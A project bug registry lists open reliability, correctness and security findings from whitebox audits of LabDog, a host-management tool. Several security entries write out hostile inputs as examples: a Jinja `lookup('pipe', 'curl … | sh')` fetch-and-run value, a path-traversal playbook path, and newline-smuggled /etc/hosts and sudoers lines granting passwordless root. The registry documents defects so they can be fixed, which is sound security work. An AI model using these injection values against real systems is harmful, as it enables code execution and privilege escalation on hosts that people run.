# Bug Registry

Open bugs in LabDog. New entries are added as bugs are surfaced.

## Convention: open-only

**Only open bugs belong in this file.** When a bug is fixed:

1. Land the fix and write a descriptive commit message that references
   the bug ID (e.g. `fix(sync): BUG-37 — dispatch Celery tasks after
   commit`). That commit message is the canonical record (symptom,
   root cause, fix).
2. Delete the entry from this file in the same commit. Do **not** mark
   bugs `[x]` and leave them here — fixed entries belong in git history,
   not in the registry.

To retrace a historical bug ID referenced elsewhere
(`BUG-NN`, `SEC-NN`, `TYPE-NN`, `DEAD-NN`), search the commit log:

```
git log --grep BUG-37
git log -- backend/app/api/sync.py
```

## How to file an entry

Format each entry as:

    - [ ] **BUG-NN** `path/to/file.ext:LINE` — one-line summary

      Symptom, root cause, severity tier (Critical / High / Medium /
      Low). If reproduced from a specific scenario, note it. Group
      related bugs under the same severity heading.

ID counter as of last housekeeping pass: `BUG-76`, `SEC-35`,
`TYPE-03`, `DEAD-01`. Pick the next number in the relevant series
when filing a new entry.

---

## Open

### Security findings — High

Filed 2026-05-21 from a `security-auditor` whitebox source-level
review (see the `code-audit` branch history for the baseline). Each entry was
spot-checked against current HEAD before filing.

_No bugs are currently open._

### Reliability — Medium

- [ ] **BUG-55** `Dockerfile:160` — the app runs as container PID 1 and never
      reaps orphaned grandchildren, so every `ssh` that outlives its `git`
      parent becomes a permanent zombie.

      **Symptom.** Zombie `ssh` processes accumulate on the container host for
      as long as the container runs. Observed on a production instance
      (`openlabdog/labdog:test`): 115 zombies — 114 `ssh`, 1 `git` — all
      parented to the `python -m app` PID, accruing at roughly 26/day over 4.4
      days of container uptime. Each zombie holds a task slot until the parent
      exits, so the count only ever grows.

      **Root cause.** `Dockerfile:160` is `CMD ["python", "-m", "app"]` with no
      init as ENTRYPOINT, so the application is PID 1. `subprocess.run` in
      `backend/app/actions/git_sync.py:50` correctly reaps `git` itself, but
      `git` spawns `ssh` for SSH remotes (`GIT_SSH_COMMAND`, set in
      `backend/app/packs/git_auth.py:87` and
      `backend/app/gitops/git_service.py:87`). When `ssh` outlives `git` it is
      orphaned, re-parented to PID 1 — the app — and there it stays: nothing in
      `backend/app/` installs a `SIGCHLD` handler or calls `waitpid`, so the
      orphan is never reaped.

      **Severity: Medium.** Not urgent at the observed rate — the affected host
      sat at 571 of 31,008 threads, about three years of headroom — but the leak
      is unbounded and scales with git-backed pack sync frequency, so a busier
      instance leaks proportionally faster. The end state is severe and not
      gracefully recoverable: once a host cannot `fork()`, it cannot start or
      stop containers, `exec` into them, or accept SSH logins, and only a reboot
      clears it. A Kubernetes node was taken out this way by an unrelated
      controller with the same PID-1 defect on 2026-08-19.

      **Reproduce.** Run the published image without `--init`, configure a
      git-backed action pack over SSH, and let pack sync run for a few days.
      `ps -eo stat,ppid,comm | awk '$1 ~ /Z/'` on the host shows the pile, all
      parented to the app PID.

      **Fix.** This should not depend on the deployment remembering to pass
      `--init` — the published image is run by people who will not. Either add
      an init as ENTRYPOINT (tini or dumb-init, `ENTRYPOINT ["/usr/bin/tini",
      "--"]`), or reap orphans in-process at startup when `os.getpid() == 1`.
      Narrowing `GIT_SSH_COMMAND` with `-o ControlMaster=no -o ControlPersist=no`
      would stop `ssh` outliving `git` in this specific path, but leaves the
      general PID-1 defect in place for any future subprocess.

      Deployments can mitigate today with `init: true` on the compose service;
      that has been applied to the lin-manager stack in `infra/docker-gitops`,
      which is what surfaced this.

### Merge correctness — Medium

- [ ] **BUG-57** `backend/app/hosts_mgmt/merge.py:118` — per-entry
      `priority` is decorative in five modules; a same-key entry
      silently overwrites instead.

      **Symptom.** Adding a hosts-file override for an IP that already
      has an entry replaces the existing one without warning. Raising
      the new entry's **Priority** does not change the outcome, and
      neither does lowering it.

      **Root cause — two defects that compound.**

      1. *The merge keys on identity alone and overwrites.* Host-level
         entries are applied as `merged[ip] = ...` with no membership
         check ([`merge.py:118-129`](backend/app/hosts_mgmt/merge.py)),
         so the last row read wins. Which row that is depends on an
         unordered `SELECT`, so the winner is not even stable. Group
         entries use the opposite rule — `if ip not in merged`,
         first-wins in `HostGroup.priority DESC` order.
      2. *`priority` is never consulted.* `HostsEntry.priority` exists
         as a column, is validated `ge=0, le=10000` in the schema, and
         is rendered as a form field — but no merge engine reads it.
         The only priority that affects any outcome is
         `HostGroup.priority`, which orders the groups.

      **Same issue, other modules.** The dead per-entry `priority`
      column is not specific to hosts entries. In each of these the
      merge reads `HostGroup.priority` only:

      | Module | Merge key | Reads entry `priority`? | Unique constraint? |
      |---|---|---|---|
      | `hosts_mgmt` | `ip_address` | No | **No** |
      | `services` | `service_name` | No | **No** |
      | `cron` | `(name, user)` | No — passthrough to response only | **No** |
      | `user_mgmt` | `username` / `groupname` | No | **No** |
      | `packages` | `package_name` | No — passthrough only | Yes |

      `packages` is the one that already behaves: it carries
      `uq_package_rules_group_pkg` / `uq_package_rules_host_pkg`, so a
      duplicate is refused at write time rather than silently resolved
      at merge time. The other four have no unique constraint on
      `(scope, key)`, which is why the collision surfaces as a silent
      overwrite.

      `rules` (firewall) is **not** affected — it genuinely orders by
      group priority then `rule.priority`
      ([`rules/merge.py:83`](backend/app/rules/merge.py)).

      **Fix direction** (not yet done). Either honour `priority` in the
      merge or remove it from the UI and schema — but not leave a
      control that reads as if it disambiguates and does nothing. The
      narrower fix the reporter asked for is to make the field
      unavailable and say so. Adding the missing unique constraints,
      following the `packages` precedent, would turn the silent
      overwrite into an honest error at the point of entry. Note that
      keying hosts entries on `ip_address` alone also forbids two
      hostnames sharing an IP, which is legitimate in `/etc/hosts`.

      Reported 2026-08-21 from the **Add Hosts Entry Override** dialog.

---

## Open — 2026-09 whitebox audit

Filed 2026-09-03 from a full whitebox review (security, correctness,
performance) of the backend, frontend, packaging and CI. Every entry was
verified against source at `c784afb` before filing; the ones already
fixed are absent rather than ticked, per the open-only convention.

Three findings from the same pass have already landed and are not
repeated here: the reflected XSS in the SPA dynamic-route rewrite, the
AI command-classifier bypasses, and the quick-win batch (unauthenticated
resolver reads, registration privilege flags, `retention_days=0` wiping
the audit log, the scheduler tick poisoning itself, two temp-dir leaks,
the sync-tray request loop, the CSRF-less password change). Search the
log: `git log --grep "SEC —"`.

**Note on the privilege model.** LabDog is deliberately flat — every
authenticated user has the same permissions and `is_superuser` gates only
user administration. That is a confirmed design decision, not a finding.
Its consequence shapes the severities below: the AI classifier, the
action-parameter validator and pack content policy are the *only* controls
protecting host root from an ordinary account, so SEC-20 and SEC-21 carry
no second line of defence.

### Security — High

- [ ] **SEC-20** `backend/app/tasks/action_host.py:478`,
      `action_group.py:490` — action-run parameters reach Ansible as
      unsanitised extra-vars and are Jinja-evaluated on the controller.

      **Symptom.** A `string` action parameter containing
      `{{ lookup('pipe', 'curl … | sh') }}` executes **on the LabDog host
      itself**, as the labdog user, the moment a playbook templates the
      value — a `msg:`, a `when:`, a `template:` src.

      **Root cause.** `extra_vars = dict(parameters)` straight from the
      `POST /api/actions/runs` body. `app/actions/validation.py:36-56`
      validates the declared *type* only; a `string` accepts any content.
      ansible-runner does not mark extravars `!unsafe`.

      **Severity: High.** Reachable by any authenticated user, which under
      the flat model means any account. This is the case `SECURITY.md`
      names as serious — untrusted content gaining execution on the LabDog
      host rather than on a target.

      **Fix direction.** Reject `{{`, `{%`, `{#` in
      `validation._annotation_for`, which all three producers (`/api/
      actions/runs`, scheduled actions, the GitOps importer) already funnel
      through, plus a fail-closed re-check in the task before the runner is
      invoked. `wrap_var`/`AnsibleUnsafeText` is *not* the fix: extravars
      are serialised to a JSON artefact before ansible-core parses them, so
      the marker does not survive the round trip.

- [ ] **SEC-21** `backend/app/actions/packs.py:127-183` — action packs are
      arbitrary controller-side code, loaded with no content policy.

      **Symptom.** A pack repo shipping `action_plugins/`, `library/` or
      `filter_plugins/` gets Python imported and executed by ansible-core
      on the LabDog host; a playbook with `connection: local`,
      `hosts: localhost` or `delegate_to: localhost` runs there too.

      **Root cause.** The loader `yaml.safe_load`s the manifest and
      validates parameter *declarations*; nothing inspects the playbook
      body, and `run_ansible` puts pack roles on `ANSIBLE_ROLES_PATH`
      (`app/ansible_runtime/runner.py:110-124`). Pack registration needs
      only an authenticated session.

      **Severity: High**, for the same reason as SEC-20 — no privilege
      boundary sits behind it.

      **Fix direction.** An `action_packs.trusted` column, defaulting
      false and backfilled true so existing packs keep working, plus an
      `assert_pack_safe` refusing plugin directories and local-execution
      plays unless trusted. Treat the flag as a deliberate-acknowledgement
      speed bump and an audit event, **not** as a privilege boundary —
      under the flat model any user can set it.

- [ ] **SEC-22** `backend/app/ssh_terminal/transcript.py:175` — web-terminal
      keystrokes are stored verbatim.

      **Symptom.** Everything typed at a `sudo` prompt, a `mysql -p`, an
      `openssl` passphrase, or any pasted token lands in plaintext in
      `ssh_session_transcripts.command_text`, readable via
      `GET /api/audit-log/ssh-sessions/{id}`.

      **Root cause.** No redaction on the write path. Host-side echo
      suppression never protected this — the keystrokes travel over the
      WebSocket regardless of whether the host echoes them.

      **Severity: High.** Not a privilege issue (the flat model is
      intended); the defect is that the secret is captured at all.

      **Fix direction.** Run each line through `app.ai.redaction.redact`
      before insert, and suppress capture between a `password:` /
      `passphrase:` prompt and the next newline. Retention already exists
      in `app/tasks/audit_retention.py` and starts working once BUG-61 is
      fixed.

### Security — Medium

- [ ] **SEC-23** `backend/app/actions/packs.py:60,74` — `manifest.playbook`
      is `.resolve()`d with no containment check, unlike
      `app/packs/service.py:56-79` which does exactly that for the pack
      subpath and documents why. A manifest with
      `playbook: ../../../../etc/labdog/labdog.toml` resolves outside the
      checkout; the file is then read into the run and its content surfaces
      in the run output shown in the UI — an arbitrary-file-read primitive
      from a pack repo. Apply the same `is_relative_to` assertion.

- [ ] **SEC-24** `backend/app/hosts_mgmt/merge.py:146` — `/etc/hosts` line
      injection. `HostsEntryCreate.comment` has no validator while
      `hostname` and `aliases` are checked against `HOSTNAME_RE`, so a
      comment containing `\n1.2.3.4 deb.debian.org` appends a real
      `/etc/hosts` line on every host in the group. Second vector to the
      same place: `HostCreate.hostname` (`app/schemas/hosts.py:33`) has no
      validator at all. Also `ssh_port` is an unbounded `int`.

- [ ] **SEC-25** `backend/app/user_mgmt/constants.py:78` — sudoers
      injection. `SUDO_FORBIDDEN_PATTERN` blocks `` [`$();|&<>] `` but not
      `\n`, so `ALL=(ALL) NOPASSWD: /bin/true\nsomeone ALL=(ALL) NOPASSWD:
      ALL` writes a two-line drop-in that `visudo -cf` accepts as valid,
      granting passwordless root to an account LabDog does not manage.

- [ ] **SEC-26** `backend/app/ansible_runtime/inventory.py:40` — the
      Ansible path ignores LabDog's own pinned host keys. It sets
      `StrictHostKeyChecking=accept-new` with no `UserKnownHostsFile`, so
      playbook runs re-accept whatever key is presented, while the asyncssh
      paths do real TOFU-with-pinning against `Host.ssh_host_key_entry`
      (`app/ssh_utils.py:140-192`). A MITM refused by the web terminal is
      accepted by the pipeline that pushes root-level configuration.

- [ ] **SEC-27** `backend/app/packs/git_auth.py:81`,
      `gitops/git_service.py:84` — git-over-SSH sets
      `StrictHostKeyChecking=accept-new` *with* `UserKnownHostsFile=/dev/null`,
      which is unconditional acceptance on every invocation: there is never
      a first use, so there is never a mismatch. An attacker who can
      intercept the pack repo connection serves arbitrary playbooks that
      LabDog then runs against the fleet. Persist the git host key on
      `GitRepository` and point the known-hosts file at it.

- [ ] **SEC-28** `backend/app/schemas/git_repos.py:167` —
      `webhook_secret` is stored in plaintext and returned by the API. The
      inline comment calls it "not a credential"; it is the HMAC key the
      webhook verifiers compare against, so anyone who reads it can forge
      push webhooks. It is also the only secret in the codebase not held in
      an `encrypted_*` column. Encrypt at rest and return
      `has_webhook_secret: bool`.

- [ ] **SEC-29** `backend/app/gitops/git_service.py:100-110` — the HTTPS
      PAT is passed on the `git` command line (`oauth2:{token}@host`), so
      it appears in `/proc/*/cmdline` and is written into `.git/config`
      until the `set_url` two lines later. The pack path already solved
      this properly with `-c http.extraHeader=…` plus
      `http.followRedirects=false` (`app/packs/git_auth.py:60-73`) — adopt
      the same mechanism.

- [ ] **SEC-30** `backend/app/auth/schemas.py:8-18` — the 12-character
      password rule exists only on the registration schema. `UserUpdate`
      has no validator, and `PATCH /api/users/me` accepts a `password`
      field, so the policy is bypassable; `AdminUserCreate.password` and
      `PasswordReset.password` are bare `str` too. Implement
      `UserManager.validate_password`, which fastapi-users calls on create
      *and* update. Related: sessions cannot be revoked — the JWT is
      stateless, so logout and password reset both leave a captured cookie
      valid for up to `session_lifetime_seconds` (24h default). A
      `token_version` claim checked per request is the cheaper of the two
      fixes; a Redis denylist needs a second store and fails open.

- [ ] **SEC-31** `backend/app/config.py:339-370` — startup validation only
      rejects the two literal placeholder secrets. A 6-character HS256
      signing key passes; `cookie_secure=False` is never questioned against
      non-loopback origins; and `allowed_origins=["*"]` with
      `allow_credentials=True` makes Starlette *reflect* the request Origin,
      silently granting credentialed cross-origin access from anywhere.

- [ ] **SEC-32** `backend/app/main.py:118-131,339-356` — the login rate
      limit collapses to one global bucket behind a reverse proxy.
      `trusted_proxies` defaults to empty, so `_get_client_ip` returns the
      proxy's address for every request and the 5/min limit is shared by
      the whole install: one attacker locks everybody out, and no
      per-attacker throttling happens. Key on `(ip, email)` and ship a
      sensible `trusted_proxies` default for the container.

- [ ] **SEC-33** `backend/app/ansible_runtime/generator.py:115-243` — the
      firewall deadman's-switch uses fixed `/tmp` paths on the *managed*
      host (`/tmp/nftables-backup.conf`, `/tmp/nftables-revert.pid`, and
      the iptables equivalents), then runs `kill $(cat …)` as root against
      one of them. `fs.protected_regular` mitigates the write side on
      modern kernels but not the read. Use an `ansible.builtin.tempfile`
      registered at the top of the play and thread the path through.
      Regenerate `bandit-baseline.json` afterwards — these are the eleven
      baselined B108 entries.

### Security — Low

- [ ] **SEC-34** Grouped, all low-impact: `/docs`, `/redoc` and
      `/openapi.json` are served unauthenticated (`app/main.py:246`);
      `app/api/ai.py:288` returns raw exception text to the client where
      `_repo_scan.py` correctly redacts it first; `/metrics` exposes
      CA-certificate names and fingerprints (`app/metrics/collector.py:250`)
      where everything else it emits is an aggregate count; and the
      terminal WebSocket calls `accept()` before authenticating, with no
      `Origin` check — blocked today by `SameSite=lax`, so defence in depth
      rather than a live hole.

- [ ] **SEC-35** Grafana, Loki, Mimir and AI-provider base URLs are
      scheme-checked but may point at loopback, RFC1918 or 169.254.169.254
      (`app/grafana/schemas.py:16-25`, `app/ai/schemas.py:25-33`). Close to
      blind — responses must parse as the expected shape and httpx does not
      follow redirects by default — and a documented homelab decision. Git
      repo URLs *do* block these (`app/schemas/git_repos.py:18-25`). Filed
      so it is not re-discovered as new, not because it needs changing.

### Correctness — Critical

- [ ] **BUG-61** `backend/app/settings_service.py:441-469` — every
      DB-backed setting read from a Celery task or an SSH path silently
      falls back to its hardcoded default.

      **Symptom.** Ten settings an operator can see and change in the UI do
      nothing. Setting `ansible.playbook_timeout` to 3600 still kills the
      playbook at 300s; `actions.preflight_enabled = 0` cannot turn
      preflight off; `logging.audit_retention_days` never takes effect.

      **Root cause.** `get_setting_sync` builds a sync URL whose second
      `.replace()` undoes the first, yielding `postgresql://` — which needs
      psycopg2, and psycopg2 is not in the dependency set. The resulting
      `ModuleNotFoundError` is swallowed by a blanket `except Exception`
      that returns `get_default(key)`. The shared `_cache` does not help:
      nothing warms these keys in a worker.

      Affected call sites: `app/ssh_utils.py:34`,
      `ansible_runtime/inventory.py:36`, `api/ssh_terminal.py:154`,
      `tasks/discovery.py:28`, `tasks/ca_cert_action.py:90`,
      `tasks/action_timeouts.py:56,91`,
      `tasks/host_sync_orchestrator.py:128`,
      `tasks/audit_retention.py:46`, `tasks/action_host.py:440`.

      **Severity: Critical** by blast radius rather than by exploitability —
      it silently disables an entire configuration surface, and it is the
      second instance of the failure mode `app/tasks/__init__.py:26-33`
      already documents for queue routing.

      **Fix direction.** Delete `get_setting_sync*`. Every call site is
      inside an `async def` reachable from `asyncio.run`, so read via
      `get_setting_typed(key, db)` on the surrounding `task_session()`;
      thread the value into the few sync leaves as a parameter. **Fixing
      this makes `retention_days` live**, so the `<= 0` guard added in the
      quick-wins batch must be in place first — it is.

      Release note required: ten inert settings start working on upgrade.

### Correctness — High

- [ ] **BUG-62** `backend/app/tasks/action_host.py:186-236`,
      `action_group.py:240-278`, `tasks/host_lock.py:494-609` — four
      defects in the per-host serialisation protocol.

      1. *The claim is split across two transactions.* The lock and busy
         check commit, then a **new** session flips the row to `running`.
         In that window a concurrent `run_host_sync` sees the host free and
         claims it, so an action and a sync run against the same host at
         once — the nftables/apt race the lock exists to prevent.
         `host_sync_orchestrator._claim_or_defer` deliberately does not do
         this (see its BUG-38 comment); the action paths do.
      2. *A deferred `ActionHostRun` is never re-dispatched.* For a group
         target with `supports_host: true` only the child row goes
         `pending`, and `dispatch_next_pending_for_host` scans parent rows
         only — nothing anywhere selects on `ActionHostRun.status ==
         "pending"`. The parent finalises `succeeded` having skipped that
         host, and the sweeper does not reclaim it because the parent is
         terminal.
      3. *The same pending `ActionRun` can be dispatched twice.* The
         dispatch calls `.delay()` without transitioning the row out of
         `pending`, and the advisory lock is keyed on the freed host only.
         Two hosts freeing at once both match the same group run; the
         second copy hits `uq_action_host_run`, and its `except` marks the
         run **failed while the first is still executing it**.
      4. *The defensive "mark failed" writes are never committed* — they
         `flush()` inside a `task_session()` that no caller commits, so a
         `SyncJob` whose host was deleted is re-examined forever.

      **Severity: High.** (1) is a data-integrity race on real hosts; (2)
      reports success for work that did not happen, which is worse than
      failing.

- [ ] **BUG-63** `backend/app/tasks/action_orchestrator.py:307-311` —
      `run_action` blocks in `result.join()` waiting for children published
      to the same worker's queue, with `celery.concurrency` defaulting to
      4. Four schedules sharing one cron minute — `0 3 * * *` is the
      obvious default — take all four slots, leaving none for any child.
      Nothing progresses until `soft_time_limit=43200` fires: twelve hours
      of a wedged fleet, then four `partial` runs with zero hosts touched.
      Route the orchestrator to its own queue served by a second worker
      (`CeleryManager` already owns one `Popen` lifecycle; generalising is
      about forty lines), or replace the join with a chord — the join keeps
      the mid-run cancel poll, which a chord would drop.

- [ ] **BUG-64** `backend/app/api/sync.py:481,673`,
      `tasks/host_lock.py:557` — a deferred bulk sync loses its
      `module_filter` and escalates to all seven modules. `SyncJob` has no
      column for the filter; the bulk endpoint stores the literal `"bulk"`
      and passes the real filter only as a Celery kwarg, so on re-dispatch
      `_filter_from_module_type("bulk")` returns `None`, meaning "every
      module". An operator who asked to reapply *firewall* on a busy host
      gets packages reinstalled, services restarted and `/etc/hosts`
      rewritten when the queue drains. Add `sync_jobs.module_filter jsonb`.
      The code half-knows: `api/sync.py:528-530` notes the same gap and
      fixes only the API response.

- [ ] **BUG-65** `backend/app/models/action_run.py:82`,
      `alembic/versions/0001_initial_schema.py:190,903,905` — deleting a
      host or group with ad-hoc action-run history raises a CHECK
      violation. The FKs are `ON DELETE SET NULL` under
      `ck_action_runs_scope`, which forbids all three target columns being
      NULL — exactly the state `SET NULL` produces for a run that targeted
      only that host. `DELETE /api/hosts/{id}` 500s with no way to remove
      the host short of manual SQL. Prefer a `target_kind` + `target_label`
      discriminator over `ON DELETE CASCADE`: cascading destroys the audit
      trail at the moment an operator most needs it, since
      `action_runs.output` is often the only record of what was run.

- [ ] **BUG-66** ~30 of 32 `conn.run()` calls pass no `timeout`
      (`app/ssh_utils.py:259`, `api/host_state.py` ×7,
      `packages/collector.py` ×8, `services/collector.py` ×5,
      `resolver/collector.py` ×3, and others). `ssh_utils` correctly bounds
      the *connect*, so the gap is specifically post-auth: a host that
      accepts TCP and auth but hangs on `nft list ruleset` or a stuck NFS
      mount blocks indefinitely. This is what makes BUG-67 and the
      in-request `collect-state` unrecoverable rather than merely slow.

### Correctness — Medium

- [ ] **BUG-76** `backend/app/main.py:_resolve_dynamic_route` — on a route
      with two dynamic segments, both are rewritten to the *second* value.

      **Symptom.** `GET /hosts/7/actions/runs/12/` serves
      `hosts/placeholder/actions/runs/placeholder/index.html` with **both**
      baked-in placeholders replaced by `12`. The host id `7` does not
      appear anywhere in the rendered flight data, so the page's `id` route
      param is wrong — the back-link and breadcrumb on an action-run page
      opened under a host point at run 12 as though it were the host.

      **Root cause.** `_resolve_dynamic_route` assigns `dynamic_value =
      part` each time it substitutes a placeholder, so only the last
      substitution survives; the rewrite then replaces every
      `"placeholder"` occurrence in the file with that single value.

      **Severity: Medium.** Cosmetic-to-confusing rather than dangerous —
      the client router still resolves the real URL, so the page fetches
      the right data. Affects `hosts/[id]/actions/runs/[runId]` and
      `groups/[id]/actions/runs/[runId]`.

      **Pre-existing**, and specifically *not* introduced by the XSS fix —
      verified by running both `dev` and the fix branch against the real
      static export, which return the identical `'12'`. Found while
      checking that the digits-only allow-list had not broken any real
      route shape; it had not.

      **Fix direction.** Return the substituted segments as an ordered
      list rather than one value, and rewrite positionally — the export
      nests them in path order, so the first placeholder in the file
      corresponds to the first substituted segment. Needs a test per
      nested route shape; the single-segment cases are already covered in
      `tests/test_spa_fallback.py`.


- [ ] **BUG-67** `backend/app/tasks/drift.py:147-153` — the periodic drift
      sweep bypasses the host lock entirely and is one serial loop. It
      overwrites `HostModuleStatus.sync_status` mid-playbook (a sync sets
      `running`; the sweep lands, reads a half-applied ruleset and writes
      `out_of_sync`), and one hung host stops every host after it in the
      loop being checked at all — silently, on every tick. Fan out through
      the locked `_builtin.drift_check` path instead.

- [ ] **BUG-68** `backend/app/hosts/dependents.py:124` — writes
      `module_type="hosts_entries"` where every consumer reads
      `"hosts_file"` (`api/hosts_drift.py`, `tasks/hosts_drift.py`,
      `api/host_state.py`, `metrics/aggregates.py`, `_MODULE_TYPE_MAPPING`,
      and the frontend). When a referenced host's IP changes, dependants
      get a new invisible row marked `out_of_sync` while the row they
      actually use still says `in_sync` and their `/etc/hosts` points at the
      old address. The firewall half of the same loop is correct, which is
      what makes it easy to miss. Needs a data migration for the stale rows,
      and the module-type strings hoisted into one enum.

- [ ] **BUG-69** All seven merge engines order by `HostGroup.priority`
      only, with no secondary key, and read each group's rules with an
      unordered `SELECT`. `host_groups.priority` has no unique constraint —
      only an application-level pre-check with a TOCTOU window — so two
      groups can share a priority and a host in both gets a
      nondeterministic winner that flips between syncs with no config
      change and no drift reported. Independently: `FirewallRule.priority`
      defaults to 0 for every rule, so within a group the first-match order
      of an nftables ruleset is whatever the `SELECT` returned, and
      `compute_diff` is set-based so it will never flag the reordering.
      Add `.order_by(priority.desc(), id.asc())` throughout and the missing
      unique index.

- [ ] **BUG-70** Ten modules register their RedBeat schedule at *import*
      time with no `last_run_at`, so every process that imports them — the
      worker and the FastAPI app both — rewrites `due_at` to `now +
      run_every`. A deployment that restarts more often than once a day
      means the daily audit-log and transcript pruning never fires, ever.
      Six of the ten swallow the failure with a bare `except Exception:
      pass`. Register from `beat_init`/`worker_ready` and only `save()`
      when the entry actually differs.

- [ ] **BUG-71** Blocking work on the event loop:
      `api/_repo_scan.py:81,216` runs a `subprocess.run` git clone with a
      120s timeout inside an async handler, freezing the entire single-worker
      API including `/health` and the terminal WebSocket;
      `main.py:263-265` does per-pack git sync in the lifespan, so an
      unreachable remote stalls startup past the container healthcheck and
      the orchestrator restarts it in a loop; and
      `tasks/host_sync_orchestrator.py:702-712` holds an open Postgres
      transaction and its asyncpg connection for the entire ansible run,
      up to 900s.

- [ ] **BUG-72** `backend/app/main.py:458` — `/health` returns
      `{"status": "ok"}` unconditionally. It never touches the database,
      Redis, or `CeleryManager.is_alive()` — which exists and is never
      called. **If the Celery subprocess dies, the container stays healthy
      forever and nothing executes tasks.** Split into a constant
      `/health/live` and a real `/health/ready`, and repoint the Dockerfile
      and systemd unit at the latter.

- [ ] **BUG-73** No index supports `check_host_busy`, which runs three
      queries per claim and sequential-scans `action_runs` and
      `action_host_runs` on every one. Neither table has any retention job,
      unlike `audit_log`, while `ActionHostRun.output` holds up to 1 MiB of
      transcript per host per run — roughly 7 GB/year for a nightly 20-host
      action, in the table every claim scans and
      `metrics/aggregates.py:462` full-scans on each 15-second Prometheus
      refresh.

- [ ] **BUG-74** `backend/app/api/host_state.py:75-232` —
      `POST /hosts/{id}/collect-state` runs seven unbounded SSH collectors
      serially inside the request, holding a pooled connection throughout
      and taking no host lock. Fifteen clicks against unresponsive hosts
      exhaust the 5+10 pool and every other request 500s on
      `pool_timeout`; run it during a sync and it clobbers the module
      status the sync is writing. Dispatch the locked
      `_builtin.collect_state` and return 202.

- [ ] **BUG-75** Frontend, three related defects.
      `app/(dashboard)/audit/page.tsx:109-120` catches every query failure
      and resolves *successfully* with an empty array, so a 401 or a 500
      renders as "No audit entries found" and the error banner below it is
      unreachable dead code — the wrong failure mode for a compliance
      surface. The same page requests no `limit`, so it is capped at the
      backend default of 50 and everything older is unreachable, while the
      column filters operate only on what was loaded. And nothing handles
      401 globally (`lib/api.ts`), so once the 24h cookie expires every
      query and mutation fails with error toasts indefinitely instead of
      redirecting to login.
